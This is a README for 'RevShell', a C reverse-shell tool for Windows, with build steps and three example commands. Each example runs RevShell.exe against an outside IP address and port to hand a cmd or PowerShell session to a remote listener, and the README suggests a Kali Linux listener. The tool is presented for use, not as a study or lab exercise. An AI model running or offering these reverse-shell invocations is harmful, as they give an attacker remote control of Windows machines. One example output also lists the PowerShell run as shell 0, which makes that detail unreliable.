# RevShell

## Description
This is a simple C-based reverse shell used to open a _cmd_ or _powershell_ session from Windows to Linux/Windows/OSx.

## Features
- [x] Open a reverse shell using cmd.exe
- [x] Open a reverse shell using powershell.exe

## How To Compile The Code
1. Download and install VisualStudio 2019 - Community Edition
2. Clone this repository to a local folder
3. Open the file "RevShell.sln"
4. Press F6 to compile the code
5. Enjoy :)

## Examples
Before starting the executable make sure you have started a listener on your favorite (Linux) distribution (eg. Kali Linux).

> Open a cmd session
```
C:\RevShell> RevShell.exe 195.135.15.7 12345
[+] SELECTED SHELL:     0
[+] VALID IP ADDRESS:   195.135.15.7
[+] VALID IP PORT:      12345
```

> Open a cmd session
```
C:\RevShell> RevShell.exe 195.135.15.7 12345 cmd
[+] SELECTED SHELL:     0
[+] VALID IP ADDRESS:   195.135.15.7
[+] VALID IP PORT:      12345
```

> Open a powershell session
```
C:\RevShell> RevShell.exe 195.135.15.7 12345 powershell
[+] SELECTED SHELL:     0
[+] VALID IP ADDRESS:   195.135.15.7
[+] VALID IP PORT:      12345
```

![Image of Cracked Pattern](https://github.com/AleDiBen/RevShell/blob/master/example.png)\
_RevShell.exe in action._